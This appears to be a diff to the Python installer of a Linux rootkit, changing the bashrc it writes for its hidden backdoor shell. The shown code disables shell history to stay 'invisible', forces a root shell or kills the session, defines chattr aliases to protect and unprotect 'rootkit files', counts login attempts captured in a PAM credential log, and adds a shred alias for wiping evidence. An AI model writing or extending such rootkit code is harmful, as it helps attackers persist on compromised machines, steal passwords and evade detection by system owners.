@@ -147,6 +147,8 @@ SHELL_MSG = """
                              .o-`           -md+`                               
                                              -dm-                               
                                                .
+      
+      
 \033[0m"""
 
 HELP_MSG = """\033[1m// execve commands\033[0m
@@ -349,10 +351,11 @@ def const_h_setup():
     open("symbols/headers/const.h", "w").write(const_h)
 
 def bash_rc_setup():
-    bash_rc = """[ -z $TERM ] && export TERM=xterm
-tty -s || return
+    bash_rc = """tty -s || return
+[ ! -z $TERM ] && export TERM=xterm
 unset HISTFILE SAVEHIST TMOUT PROMPT_COMMAND # WE'RE SUPPOSED TO BE INVISIBLE, DAN
-[ $(id -u) != 0 ] && su root || kill -9 $$
+[ $(id -u) != 0 ] && su root
+[ $(id -u) != 0 ] && kill -9 $$
 [ -f "README" ] && cat README | less && rm -f README
 
 clear
@@ -378,7 +381,7 @@ alias unchattr='cd {0}; chattr -ia * &>/dev/null; echo "chattr permissions remov
 alias rechattr='cd {0}; chattr +ia * &>/dev/null; echo "rootkit files chattr permissions reinstated"'
 
 echo -e "\\033[1mLogged login attempts: \\033[1;31m$(grep Username ~/pam_auth_logs 2>/dev/null | wc -l)\\033[0m"
-[ -f `which shred 2>/dev/null || echo "NO"` ] && alias vshred='shred -n 5 --random-source=/dev/urandom -uvz' && echo "shred is available on this box. `alias vshred` made."
+[ -f `which shred 2>/dev/null || echo "NO"` ] && alias vshred='shred -n 5 --random-source=/dev/urandom -uvz' && echo "shred is available. `alias vshred` made.."
 """
     fd = open("bashrc", "w")
     fd.write(bash_rc.format(INSTALL))
